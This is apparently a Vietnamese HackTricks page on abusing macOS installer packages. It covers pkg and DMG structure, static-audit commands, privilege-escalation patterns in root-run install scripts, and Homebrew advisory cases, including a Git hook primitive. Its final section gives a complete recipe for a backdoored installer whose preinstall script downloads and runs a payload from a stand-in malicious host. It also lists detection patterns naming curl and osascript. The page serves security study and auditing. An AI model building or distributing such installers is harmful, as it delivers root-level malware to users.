# Lạm dụng trình cài đặt macOS

{{#include ../../../banners/hacktricks-training.md}}

## Thông tin cơ bản về Pkg

**Gói cài đặt** macOS (còn được gọi là tệp `.pkg`) là định dạng tệp được macOS sử dụng để **phân phối phần mềm**. Những tệp này giống như một **chiếc hộp chứa mọi thứ mà phần mềm cần** để cài đặt và chạy đúng cách.

Bản thân tệp package là một kho lưu trữ chứa **cấu trúc phân cấp các tệp và thư mục sẽ được cài đặt trên máy tính đích**. Tệp cũng có thể bao gồm **script** để thực hiện các tác vụ trước và sau khi cài đặt, chẳng hạn như thiết lập tệp cấu hình hoặc dọn dẹp các phiên bản phần mềm cũ.

### Cấu trúc package

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Tùy chỉnh (tiêu đề, văn bản chào mừng…) và kiểm tra script/cài đặt
- **PackageInfo (xml)**: Thông tin, yêu cầu cài đặt, vị trí cài đặt, đường dẫn đến các script cần chạy
- **Bill of materials (bom)**: Danh sách các tệp cần cài đặt, cập nhật hoặc xóa cùng quyền truy cập tệp
- **Payload (kho lưu trữ CPIO được nén bằng gzip)**: Các tệp cần cài đặt vào `install-location` trong PackageInfo
- **Scripts (kho lưu trữ CPIO được nén bằng gzip)**: Các script chạy trước và sau khi cài đặt cùng nhiều tài nguyên khác được giải nén vào thư mục tạm để thực thi.

### Giải nén

```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```

Để xem nội dung của trình cài đặt mà không cần tự giải nén, bạn cũng có thể dùng công cụ miễn phí [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Mẹo phân tích tĩnh nhanh

Nếu mục tiêu là phân tích, hãy **tránh mở gói bằng `Installer.app` trước**. Một số gói có thể thực thi mã ngay khi Installer mở chúng (chẳng hạn thông qua `system.run()` hoặc plug-in của trình cài đặt), vì vậy bắt đầu bằng cách trích xuất ngoại tuyến thường an toàn hơn.

```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```

## Thông tin cơ bản về DMG

Tệp DMG, hay Apple Disk Images, là định dạng tệp được macOS của Apple sử dụng cho ảnh đĩa. Tệp DMG về cơ bản là một **ảnh đĩa có thể mount** (chứa filesystem riêng) với dữ liệu khối thô, thường được nén và đôi khi được mã hóa. Khi mở tệp DMG, macOS **mount tệp như thể đó là một ổ đĩa vật lý**, cho phép bạn truy cập nội dung bên trong.

> [!CAUTION]
> Lưu ý rằng trình cài đặt **`.dmg`** hỗ trợ **rất nhiều định dạng**, đến mức trước đây một số định dạng có lỗ hổng đã bị khai thác để đạt được **thực thi mã kernel**.

### Cấu trúc ảnh đĩa

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Cấu trúc phân cấp của tệp DMG có thể khác nhau tùy theo nội dung. Tuy nhiên, DMG dành cho ứng dụng thường có cấu trúc như sau:

- Cấp cao nhất: Đây là thư mục gốc của ảnh đĩa. Thư mục này thường chứa ứng dụng và có thể có liên kết đến thư mục Applications.
  - Ứng dụng (.app): Đây là ứng dụng thực tế. Trong macOS, ứng dụng thường là một package chứa nhiều tệp và thư mục riêng lẻ cấu thành ứng dụng.
  - Liên kết Applications: Đây là lối tắt đến thư mục Applications trong macOS. Mục đích là giúp bạn cài đặt ứng dụng dễ dàng hơn. Bạn có thể kéo tệp .app vào lối tắt này để cài đặt ứng dụng.

## Privesc qua việc lạm dụng pkg

### Thực thi từ các thư mục công khai

Nếu script trước hoặc sau khi cài đặt thực thi một tệp như **`/var/tmp/Installerutil`** và kẻ tấn công có thể thay thế tệp đó, kẻ tấn công có thể leo thang đặc quyền khi trình cài đặt gọi tệp này. Các bài nói chuyện và hướng dẫn được trích dẫn trình bày những biến thể của kiểu sử dụng script bên ngoài không an toàn này.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Đây là một [hàm công khai](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) mà một số trình cài đặt và trình cập nhật gọi để **thực thi nội dung nào đó với quyền root**. Hàm này nhận **đường dẫn** đến **tệp** cần **thực thi** làm tham số. Tuy nhiên, nếu kẻ tấn công có thể **sửa đổi** tệp này, họ sẽ có thể **lạm dụng** việc thực thi tệp với quyền root để **leo thang đặc quyền**.

```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```

Để biết thêm thông tin, hãy xem bài nói chuyện này: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Lạm dụng environment và shebang

Các lỗi hiện đại trong PackageKit cho thấy các script cài đặt thường được thực thi dưới dạng **mã root đáng tin cậy**, trong khi vẫn có ngữ cảnh do attacker kiểm soát ở gần đó. Khi kiểm tra các gói của nhà cung cấp, hãy đặc biệt chú ý đến:

- Các trình thông dịch shell như `#!/bin/zsh` / `#!/bin/bash`
- Các lệnh như `sudo -u $USER`, `launchctl asuser` hoặc bất kỳ logic nào tin cậy `$USER`, `$HOME`, `PATH`, `TMPDIR` hay các đường dẫn tương đối
- Các trình thông dịch không phải shell có thể tải các tệp khởi tạo hoặc thư viện do người dùng kiểm soát

```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```

Với lỗi môi trường root của PackageKit năm 2024 (kế thừa `~/.zshenv` / `~/.bash*` trong quá trình cài đặt do người dùng khởi chạy), hãy xem [trang macOS privesc tổng quát](../macos-privilege-escalation.md). Nếu package được **Apple ký**, cùng lỗi script này có thể trở nên **liên quan đến SIP/TCC** vì `system_installd` có thể mang `com.apple.rootless.install.heritable`; xem [trang SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Đầu vào có trạng thái và callback ngầm

Đừng chỉ giới hạn việc rà soát ở lỗi command injection hiển nhiên. `preinstall`/`postinstall` chạy với quyền root có thể vượt qua ranh giới tin cậy bất cứ khi nào nó sử dụng **trạng thái đã tồn tại trước khi cài đặt**: các file có tên dễ đoán trong `/tmp` hoặc `/var/tmp`, cây cài đặt hiện có mà người dùng có quyền ghi, file cấu hình, metadata của repository hoặc tên người dùng sau đó được truyền cho `chown`.<sup>[[9]](#references)[[10]](#references)</sup>

Hai lỗi gần đây trong trình cài đặt Homebrew cho thấy các biến thể có thể tái sử dụng:

- **Quyền sở hữu do kẻ tấn công lựa chọn:** một giá trị ghi đè người dùng package được đọc từ `/var/tmp/.homebrew_pkg_user.plist` có thể dự đoán, nhưng không xác thực chủ sở hữu, mode, ACL, trạng thái symlink hay nguồn gốc. Người dùng có đặc quyền thấp có thể chọn tài khoản của mình, rồi `postinstall` chạy với quyền root sẽ chuyển quyền sở hữu đệ quy cây Homebrew và cache cho tài khoản đó. Đây là lỗi gán đặc quyền, không phải shell injection.<sup>[[9]](#references)</sup>
- **Callback công cụ từ cây hiện có:** `postinstall` chạy với quyền root thực thi `git checkout` bên trong một bản cài đặt được chủ ý cho phép người dùng thông thường ghi vào. Do đó, việc đặt một file thực thi `.git/hooks/post-checkout` sẽ biến lần nâng cấp package qua GUI/MDM sau đó thành thực thi mã với quyền root. Trên đường xử lý Intel, việc hợp nhất thư mục `.git` trong package vào repository hiện có cũng giữ lại các hook do kẻ tấn công thêm vào.<sup>[[10]](#references)</sup>

Primitive thứ hai dễ mô phỏng trong một bài kiểm thử được ủy quyền; nó chỉ được kích hoạt khi trình cài đặt đặc quyền bị lỗ hổng chạy thao tác Git hỗ trợ hook sau đó.<sup>[[10]](#references)</sup>

```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```

Mở rộng các gói lồng nhau và ánh xạ mọi nguồn do attacker kiểm soát đến sink có đặc quyền. Ngoài việc thực thi trực tiếp, hãy tìm các bộ phân tích cú pháp, thao tác thay đổi quyền sở hữu và công cụ có cơ chế plug-in/hook.<sup>[[9]](#references)[[10]](#references)</sup>

```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```

Để hardening, hãy chuyển các đầu vào có đặc quyền vào một thư mục staging do root sở hữu và xác thực từng đường dẫn ngay trước khi sử dụng (tệp thông thường, chủ sở hữu/chế độ quyền như mong đợi, không có ACL không an toàn và không đi qua symlink). Tránh thay đổi quyền sở hữu đệ quy từ một danh tính không đáng tin cậy. Khi Git phải chạy trên một cây thư mục có sẵn, hãy chủ động vô hiệu hóa callback (ví dụ: `git -c core.hooksPath=/dev/null ...`) hoặc thay thế nguyên tử metadata của repository trước khi gọi Git.<sup>[[9]](#references)[[10]](#references)</sup>

### Thực thi bằng cách mount

Nếu installer ghi vào `/tmp/fixedname/bla/bla`, có thể **tạo một mount** chồng lên `/tmp/fixedname` với tùy chọn noowners để bạn có thể **sửa bất kỳ tệp nào trong quá trình cài đặt** nhằm lạm dụng quy trình cài đặt.

Một ví dụ là **CVE-2021-26089**, khai thác được để **ghi đè một script chạy định kỳ** và thực thi với quyền root. Để biết thêm thông tin, hãy xem bài nói chuyện: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg dưới dạng malware

### Payload rỗng

Có thể chỉ tạo một tệp **`.pkg`** với các script **pre-install và post-install**, không có payload thực sự nào ngoài malware bên trong các script đó.<sup>[[2]](#references)</sup>

### JS trong Distribution xml

Có thể thêm thẻ **`<script>`** vào tệp **distribution xml** của package; mã bên trong sẽ được thực thi và có thể **chạy lệnh** bằng **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Trong các distribution package, việc này thường phụ thuộc vào việc tệp `Distribution` cấp cao nhất cho phép script bên ngoài, chẳng hạn bằng `allow-external-scripts="true"`. Vì vậy, chỉ xem xét `preinstall` / `postinstall` là chưa đủ: bản thân **Distribution XML** có thể chứa các hook `installation-check` / `volume-check` và đường dẫn thực thi trực tiếp `system.run()` / `system.runOnce()`.

```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```

### Trình cài đặt bị cài backdoor

Trình cài đặt độc hại sử dụng script và mã JS bên trong dist.xml

```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
    <title>Malicious Installer</title>
    <options allow-external-scripts="true" customize="allow" require-scripts="true"/>
    <script>
        <![CDATA[
        function installationCheck() {
            if (system.isSandboxed()) {
                my.result.title = "Cannot install in a sandbox.";
                my.result.message = "Please run this installer outside of a sandbox.";
                return false;
            }
            return true;
        }
        function volumeCheck() {
            return true;
        }
        function preflight() {
            system.run("/path/to/preinstall");
        }
        function postflight() {
            system.run("/path/to/postinstall");
        }
        ]]>
    </script>
    <choices-outline>
        <line choice="default">
            <line choice="myapp"/>
        </line>
    </choices-outline>
    <choice id="myapp" title="MyApp">
        <pkg-ref id="com.malicious.myapp"/>
    </choice>
    <pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```



## References

- [1] [DEF CON 27 - Giải nén Pkgs: Nhìn bên trong các gói cài đặt macOS và những lỗi bảo mật phổ biến](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "Thế giới hoang dã của các bộ cài macOS" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Giải nén Pkgs: Nhìn bên trong các gói cài đặt macOS](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming macOS: Khai thác các gói cài đặt](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: Leo thang đặc quyền trong PackageKit của macOS](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Phá vỡ SIP bằng các gói do Apple ký](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Núi lỗi" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Chết bởi 1000 bộ cài trên macOS, và mọi thứ đều hỏng!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Bộ cài macOS của Homebrew tin tưởng plist package-user do người dùng kiểm soát](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [Thực thi mã với quyền root thông qua Git hooks trong postinstall của PKG macOS](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
